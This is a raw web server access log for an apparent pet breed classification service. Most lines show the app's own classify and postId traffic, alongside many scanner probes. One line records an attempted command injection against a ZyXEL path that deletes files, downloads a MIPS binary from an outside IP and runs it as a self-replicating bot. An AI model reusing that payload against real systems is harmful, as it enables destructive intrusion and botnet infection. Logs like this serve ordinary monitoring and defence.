110.8.166.180 - - [13/Nov/2023:22:18:59 +0900] "POST /breed_classification/classify/ HTTP/1.1" 200 1 "https://savethepets.kro.kr/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
110.8.166.180 - - [13/Nov/2023:22:19:08 +0900] "POST /breed_classification/classify/ HTTP/1.1" 200 1 "https://savethepets.kro.kr/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
110.8.166.180 - - [13/Nov/2023:22:19:13 +0900] "POST /breed_classification/classify/ HTTP/1.1" 200 1 "https://savethepets.kro.kr/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
110.8.166.180 - - [13/Nov/2023:22:19:42 +0900] "GET /breed_classification?postId=3 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [13/Nov/2023:22:19:51 +0900] "GET /breed_classification/?postId=3 HTTP/1.1" 200 1 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [13/Nov/2023:22:21:29 +0900] "POST /breed_classification/classify/ HTTP/1.1" 200 1 "https://savethepets.kro.kr/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
110.8.166.180 - - [13/Nov/2023:22:21:48 +0900] "GET /breed_classification?postId=4 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [13/Nov/2023:22:21:49 +0900] "GET /breed_classification/?postId=4 HTTP/1.1" 200 1 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [13/Nov/2023:22:27:33 +0900] "POST /breed_classification/classify/ HTTP/1.1" 200 1 "https://savethepets.kro.kr/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
110.8.166.180 - - [13/Nov/2023:22:27:51 +0900] "POST /breed_classification/classify/ HTTP/1.1" 200 1 "https://savethepets.kro.kr/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
110.8.166.180 - - [13/Nov/2023:22:28:11 +0900] "GET /breed_classification?postId=5 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [13/Nov/2023:22:28:20 +0900] "GET /breed_classification/?postId=5 HTTP/1.1" 200 1 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [13/Nov/2023:22:31:50 +0900] "POST /breed_classification/classify/ HTTP/1.1" 200 1 "https://savethepets.kro.kr/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
110.8.166.180 - - [13/Nov/2023:22:32:07 +0900] "GET /breed_classification?postId=6 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [13/Nov/2023:22:32:17 +0900] "GET /breed_classification/?postId=6 HTTP/1.1" 200 1 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [13/Nov/2023:22:36:30 +0900] "POST /breed_classification/classify/ HTTP/1.1" 200 1 "https://savethepets.kro.kr/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
110.8.166.180 - - [13/Nov/2023:22:36:47 +0900] "GET /breed_classification?postId=7 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [13/Nov/2023:22:36:48 +0900] "GET /breed_classification/?postId=7 HTTP/1.1" 200 1 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [13/Nov/2023:22:39:45 +0900] "GET /breed_classification?postId=8 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
192.168.45.1 - - [13/Nov/2023:22:39:55 +0900] "POST /breed_classification/classify/ HTTP/1.1" 200 1 "https://savethepets.kro.kr/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
110.8.166.180 - - [13/Nov/2023:22:39:59 +0900] "GET /breed_classification/?postId=8 HTTP/1.1" 200 1 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
192.168.45.1 - - [13/Nov/2023:22:40:27 +0900] "POST /breed_classification/classify/ HTTP/1.1" 200 1 "https://savethepets.kro.kr/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
110.8.166.180 - - [13/Nov/2023:22:40:43 +0900] "GET /breed_classification?postId=9 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [13/Nov/2023:22:40:44 +0900] "GET /breed_classification/?postId=9 HTTP/1.1" 200 1 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [13/Nov/2023:22:41:43 +0900] "POST /breed_classification/classify/ HTTP/1.1" 200 1 "https://savethepets.kro.kr/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
110.8.166.180 - - [13/Nov/2023:22:41:45 +0900] "GET /breed_classification?postId=10 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [13/Nov/2023:22:41:46 +0900] "GET /breed_classification/?postId=10 HTTP/1.1" 200 2 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [13/Nov/2023:22:46:58 +0900] "GET /breed_classification?postId=11 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [13/Nov/2023:22:46:58 +0900] "GET /breed_classification/?postId=11 HTTP/1.1" 200 2 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
192.168.45.1 - - [13/Nov/2023:22:48:02 +0900] "POST /breed_classification/classify/ HTTP/1.1" 200 1 "https://savethepets.kro.kr/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
110.8.166.180 - - [13/Nov/2023:22:48:25 +0900] "GET /breed_classification?postId=12 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [13/Nov/2023:22:48:28 +0900] "GET /breed_classification/?postId=12 HTTP/1.1" 200 2 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [13/Nov/2023:22:52:12 +0900] "POST /breed_classification/classify/ HTTP/1.1" 200 1 "https://savethepets.kro.kr/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
110.8.166.180 - - [13/Nov/2023:22:52:20 +0900] "GET /breed_classification?postId=13 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [13/Nov/2023:22:52:22 +0900] "GET /breed_classification/?postId=13 HTTP/1.1" 200 2 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
167.99.13.19 - - [13/Nov/2023:23:01:35 +0900] "GET /Temporary_Listen_Addresses HTTP/1.1" 301 169 "-" "Mozilla/5.0 zgrab/0.x"
167.99.13.19 - - [13/Nov/2023:23:01:35 +0900] "GET /Pages/log/ HTTP/1.1" 301 169 "-" "Mozilla/5.0 zgrab/0.x"
107.170.243.29 - - [13/Nov/2023:23:11:03 +0900] "GET /ReportServer HTTP/1.1" 301 169 "-" "Mozilla/5.0 zgrab/0.x"
110.8.166.180 - - [13/Nov/2023:23:14:21 +0900] "GET /breed_classification?postId=14 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [13/Nov/2023:23:14:24 +0900] "GET /breed_classification/?postId=14 HTTP/1.1" 200 2 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [13/Nov/2023:23:16:32 +0900] "GET /breed_classification?postId=15 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [13/Nov/2023:23:16:33 +0900] "GET /breed_classification/?postId=15 HTTP/1.1" 200 2 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
83.97.73.87 - - [13/Nov/2023:23:22:03 +0900] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
83.97.73.87 - - [13/Nov/2023:23:22:04 +0900] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 404 179 "http://180.65.33.140:80/?XDEBUG_SESSION_START=phpstorm" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
192.168.45.1 - - [13/Nov/2023:23:24:39 +0900] "POST /breed_classification/classify/ HTTP/1.1" 200 1 "https://savethepets.kro.kr/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
167.94.138.49 - - [13/Nov/2023:23:31:09 +0900] "GET / HTTP/1.1" 404 179 "-" "-"
167.94.138.49 - - [13/Nov/2023:23:31:10 +0900] "GET / HTTP/1.1" 404 179 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
110.8.166.180 - - [13/Nov/2023:23:32:02 +0900] "GET /breed_classification?postId=16 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [13/Nov/2023:23:32:03 +0900] "GET /breed_classification/?postId=16 HTTP/1.1" 200 2 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [13/Nov/2023:23:33:51 +0900] "POST /breed_classification/classify/ HTTP/1.1" 200 1 "https://savethepets.kro.kr/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
110.8.166.180 - - [13/Nov/2023:23:34:03 +0900] "GET /breed_classification?postId=17 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [13/Nov/2023:23:34:07 +0900] "GET /breed_classification/?postId=17 HTTP/1.1" 200 2 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [13/Nov/2023:23:39:19 +0900] "GET /breed_classification?postId=18 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [13/Nov/2023:23:39:19 +0900] "GET /breed_classification/?postId=18 HTTP/1.1" 200 2 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
192.168.45.1 - - [13/Nov/2023:23:39:46 +0900] "POST /breed_classification/classify/ HTTP/1.1" 200 1 "https://savethepets.kro.kr/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
110.8.166.180 - - [13/Nov/2023:23:40:10 +0900] "GET /breed_classification?postId=19 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [13/Nov/2023:23:40:21 +0900] "GET /breed_classification/?postId=19 HTTP/1.1" 200 2 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
192.168.45.1 - - [13/Nov/2023:23:41:03 +0900] "POST /breed_classification/classify/ HTTP/1.1" 200 1 "https://savethepets.kro.kr/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
110.8.166.180 - - [13/Nov/2023:23:41:13 +0900] "GET /breed_classification?postId=20 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [13/Nov/2023:23:41:15 +0900] "GET /breed_classification/?postId=20 HTTP/1.1" 200 2 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [13/Nov/2023:23:43:58 +0900] "GET /breed_classification?postId=21 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [13/Nov/2023:23:44:00 +0900] "GET /breed_classification/?postId=21 HTTP/1.1" 200 2 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [13/Nov/2023:23:46:58 +0900] "GET /breed_classification?postId=22 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [13/Nov/2023:23:47:00 +0900] "GET /breed_classification/?postId=22 HTTP/1.1" 200 2 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [13/Nov/2023:23:49:28 +0900] "GET /breed_classification?postId=23 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [13/Nov/2023:23:49:30 +0900] "GET /breed_classification/?postId=23 HTTP/1.1" 200 2 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [13/Nov/2023:23:50:09 +0900] "GET /breed_classification?postId=24 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [13/Nov/2023:23:50:11 +0900] "GET /breed_classification/?postId=24 HTTP/1.1" 200 2 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [13/Nov/2023:23:50:54 +0900] "GET /breed_classification?postId=25 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [13/Nov/2023:23:50:56 +0900] "GET /breed_classification/?postId=25 HTTP/1.1" 200 2 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [13/Nov/2023:23:53:00 +0900] "GET /breed_classification?postId=26 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [13/Nov/2023:23:53:02 +0900] "GET /breed_classification/?postId=26 HTTP/1.1" 200 2 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
199.45.155.32 - - [13/Nov/2023:23:58:36 +0900] "GET / HTTP/1.1" 301 169 "-" "-"
199.45.155.32 - - [13/Nov/2023:23:58:36 +0900] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
199.45.155.32 - - [13/Nov/2023:23:58:36 +0900] "PRI * HTTP/2.0" 400 157 "-" "-"
199.45.155.32 - - [13/Nov/2023:23:58:36 +0900] "GET / HTTP/1.1" 404 179 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
179.43.163.133 - - [14/Nov/2023:00:04:01 +0900] "GET / HTTP/1.1" 301 169 "-" "-"
83.97.73.87 - - [14/Nov/2023:00:04:55 +0900] "GET /actuator/gateway/routes HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
83.97.73.87 - - [14/Nov/2023:00:05:00 +0900] "GET /actuator/gateway/routes HTTP/1.1" 404 179 "http://180.65.33.140:80/actuator/gateway/routes" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
179.43.163.133 - - [14/Nov/2023:00:14:16 +0900] "GET / HTTP/1.1" 301 169 "-" "-"
45.128.232.63 - - [14/Nov/2023:00:22:38 +0900] "CONNECT google.com:443 HTTP/1.1" 400 157 "-" "-"
95.54.205.177 - - [14/Nov/2023:00:24:24 +0900] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 301 169 "-" "Censys"
193.35.18.187 - - [14/Nov/2023:00:33:23 +0900] "CONNECT google.com:443 HTTP/1.1" 400 157 "-" "-"
87.236.176.151 - - [14/Nov/2023:00:55:01 +0900] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
87.236.176.151 - - [14/Nov/2023:00:55:02 +0900] "GET / HTTP/1.1" 404 179 "http://180.65.33.140" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
109.205.213.94 - - [14/Nov/2023:01:06:03 +0900] "GET / HTTP/1.1" 301 169 "-" "NiggaBalls"
179.43.163.133 - - [14/Nov/2023:01:34:31 +0900] "GET / HTTP/1.1" 301 169 "-" "-"
181.214.166.113 - - [14/Nov/2023:02:03:27 +0900] "\xF2*\x17\xCA\xAF\x1Eg\x7F\xA5\x9Er\xC7\x97\xE2\x84\xCF" 400 157 "-" "-"
89.248.165.95 - - [14/Nov/2023:02:06:13 +0900] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 157 "-" "-"
89.248.165.95 - - [14/Nov/2023:02:06:13 +0900] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 157 "-" "-"
192.241.216.5 - - [14/Nov/2023:02:14:07 +0900] "GET /login HTTP/1.1" 404 179 "-" "Mozilla/5.0 zgrab/0.x"
66.240.236.116 - - [14/Nov/2023:02:21:37 +0900] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 zgrab/0.x"
43.135.123.64 - - [14/Nov/2023:02:33:10 +0900] "\xFF\xA2\xFF\x00\xFF=\xFF\xAD\xFF\x00\xFF\xD1\xFF\xD8\xF1\xAD\xFF\xBEH\xFB_5\xFF\xAD\xF1" 400 157 "-" "-"
43.135.123.64 - - [14/Nov/2023:02:33:10 +0900] "o\xFA\xC0\xBE\xB8\xC0\xA4\xC9\x89\xA2\xC2\x8F\x83\xAF\x91\x97\xBE\xCD\xB9\xCF\xAC\x9B\xB0\xAB\xA0\xB6\xB1\xAA\x9D\x9C\x9F\x96\x8D\x93\xCE\xB4\xB3\xB5\x98\xCD\xA6\xFA\xFA\xFA\xFA\x12\xFD\xD8\xF8\xFA\xFA\xC2\xFA\xFA\xFA\xFA\x1Af\xEC\xF9\xFA\xFA\xFA\xFA\xFB\xE5q\xF2\xFA\xFA\xFA\xFA\xFA\xFA\xF9wh\x97ui\xBA\xEA=E\xF0\x1B/\xA7XJ\xF11Y\x0B\xBF\xB1K\x1F\x00\xFA\xF8\xAF5Y\xDB\xA1\xA2 \xE00\xCC\xBAU]<\x15\x14\xBA\xC7W7c\x02\x98\xC996\x95\x1C\xC5\x164yR\xE7\x8C\x90\x8E\x06\x92w\xCD\xE9\x0E\x14!\x19\x87KE\xE1\x86 ,)\xEA\x85_\x16I(\x86\x8B?\xADXx\xD7\xE7\xB67\x83\xF1\xFC;\x83\xC8\x0F\xAE\xDD\x1A\xCA\xBF\xD3\xF0\x98\xAA\xD9=\xD0\xD0\xD6\xEF\xABQZ`\xBCrhc@[\x9Cz\xEA\x8AJ|\x8F\xEF\x86V\x11\xDC\xBB\x5C\xF8T\xF3=\x9B\xAF\x11\xBD8\x96\xAD\xE7e~`ov\xCC\xB6\xCA\xDE\xB78\xDC\xD88w9\x91\x8C\xD1\xDE/\x98\xCA\x8D%\xDC\x85+sb\xAE\xE5&\xCA\x08\x06\xFF\x9Ev\xA5\x96\xED\x0F\xBC\xEA2\xFA\x1F7\x03\xC9g\x83)TF$H\xA8\xD2\xA24\x91\x80\xABg\x0CF+\xBFx*w\x19\x01\x0E\xFF\xCF\x1B\xA8\x9AJrF.\x0B\x9D\x84\xF2\xEE\x80Y\x18\xD4\x12\xFE\x14\x89\x9B\x8C\x9AL6\x17\x09\xF25\x5C\xEDb\x02\x89\xCD\xA7|\xC9zL\x97\x81\x92\x96\xA3\xC4g\xB4(\xE3k\x82Gk\xC1\x90B\xE6][\xE1\x02\x9B\x86?Tua\x1C\xE0\xFC\x9F\x8D\xEB\x01\xAB\xC0\xE5\xD6\x98\xD5\xE0<\x93\xEA\x00\x8DT\xE9\x05\x04y-G\x0E\xC5R\x0E\x18\xF4\xC1\xD6\x8E\xBDi\xBBf\xBC1Z-\xFD\x90N\x16\x81\x07C*mk\x11\xBCZ\x02\x85\x95a\xDE\xAB\xA8\xB7\xA3\xA7;\x19\xDE\xB3\xD7" 400 157 "-" "-"
43.135.123.64 - - [14/Nov/2023:02:33:10 +0900] "\x02" 400 157 "-" "-"
43.135.123.64 - - [14/Nov/2023:02:33:16 +0900] "\x00\x00\x00" 400 157 "-" "-"
199.45.155.16 - - [14/Nov/2023:02:35:22 +0900] "GET / HTTP/1.1" 404 179 "-" "-"
199.45.155.16 - - [14/Nov/2023:02:35:23 +0900] "GET / HTTP/1.1" 404 179 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
157.230.8.75 - - [14/Nov/2023:02:45:11 +0900] "\x00\x00\x00\xB2\x9A\xD6\x8E\xCF.\x22\x83\xA9\xBF2\xBA|ro\xAE_\x95\xEC\x80\xE4\xE9n\x82q\x9E\xC6\xA9\x8F\xF5" 400 157 "-" "-"
71.6.232.24 - - [14/Nov/2023:02:46:56 +0900] "GET / HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
192.241.204.28 - - [14/Nov/2023:02:52:15 +0900] "MGLNDD_180.65.33.140_443" 400 157 "-" "-"
209.141.60.74 - - [14/Nov/2023:03:01:03 +0900] "GET / HTTP/1.1" 404 179 "https://wenvpn.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"
192.168.45.1 - - [15/Nov/2023:19:05:53 +0900] "POST /breed_classification/classify/ HTTP/1.1" 200 1 "-" "PostmanRuntime/7.32.3"
59.10.150.61 - - [15/Nov/2023:19:08:13 +0900] "GET /bin/zhttpd/${IFS}cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}*;${IFS}wget${IFS}http://103.110.33.164/mips;${IFS}chmod${IFS}777${IFS}mips;${IFS}./mips${IFS}zyxel.selfrep;" 400 255 "-" "-"
184.105.247.254 - - [15/Nov/2023:19:08:33 +0900] "GET / HTTP/1.1" 404 179 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
152.89.198.113 - - [15/Nov/2023:19:09:44 +0900] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 157 "-" "-"
63.251.232.92 - - [15/Nov/2023:19:10:13 +0900] "GET /Electron/download/windows/%5CProgram%20Files%5C3CX%20Phone%20System%5CData%5CDB%5Cbase%5C16384%5C16393 HTTP/1.1" 404 179 "-" "xfa1"
184.105.247.254 - - [15/Nov/2023:19:12:46 +0900] "GET /webui/ HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.78"
184.105.247.254 - - [15/Nov/2023:19:15:52 +0900] "GET /favicon.ico HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.50"
184.105.247.254 - - [15/Nov/2023:19:17:16 +0900] "GET /dns-query?name=dnsscan.shadowserver.org&type=A HTTP/1.1" 404 179 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
184.105.247.254 - - [15/Nov/2023:19:21:47 +0900] "GET /geoserver/web/ HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.78"
184.105.247.254 - - [15/Nov/2023:19:22:32 +0900] "GET /.git/config HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 OPR/95.0.0.0"
27.0.238.186 - - [15/Nov/2023:19:30:43 +0900] "GET / HTTP/1.1" 404 179 "-" "facebookexternalhit/1.1; kakaotalk-scrap/1.0; +https://devtalk.kakao.com/t/scrap/33984"
143.110.184.140 - - [15/Nov/2023:19:39:21 +0900] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
143.110.162.202 - - [15/Nov/2023:19:39:38 +0900] "GET / HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
216.218.206.66 - - [15/Nov/2023:19:47:51 +0900] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x98\x7F\xA2Z\x04\xD8\x83fR\x89\xED\xACb\xDF\x1F*f\x9F\x01\xFAU\x04\xFFF\xD3" 400 157 "-" "-"
46.101.78.34 - - [15/Nov/2023:19:54:43 +0900] "GET / HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
165.229.229.46 - - [15/Nov/2023:20:01:10 +0900] "GET / HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
165.229.229.46 - - [15/Nov/2023:20:01:10 +0900] "GET /favicon.ico HTTP/1.1" 404 179 "https://savethepetsai.kro.kr/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
192.168.45.1 - - [15/Nov/2023:20:03:28 +0900] "GET / HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
192.168.45.1 - - [15/Nov/2023:20:03:43 +0900] "GET / HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
165.229.229.46 - - [15/Nov/2023:20:04:08 +0900] "GET / HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
110.8.166.180 - - [15/Nov/2023:20:10:12 +0900] "GET /breed_classification?postId=1 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [15/Nov/2023:20:10:13 +0900] "GET /breed_classification/?postId=1 HTTP/1.1" 200 1 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [15/Nov/2023:20:14:14 +0900] "GET /breed_classification?postId=2 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
39.7.46.167 - - [15/Nov/2023:20:14:23 +0900] "POST /breed_classification/classify/ HTTP/1.1" 200 1 "https://savethepets.kro.kr/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
110.8.166.180 - - [15/Nov/2023:20:14:24 +0900] "GET /breed_classification/?postId=2 HTTP/1.1" 200 1 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
39.7.46.167 - - [15/Nov/2023:20:14:36 +0900] "POST /breed_classification/classify/ HTTP/1.1" 200 1 "https://savethepets.kro.kr/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
39.7.46.167 - - [15/Nov/2023:20:15:01 +0900] "POST /breed_classification/classify/ HTTP/1.1" 200 1 "https://savethepets.kro.kr/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
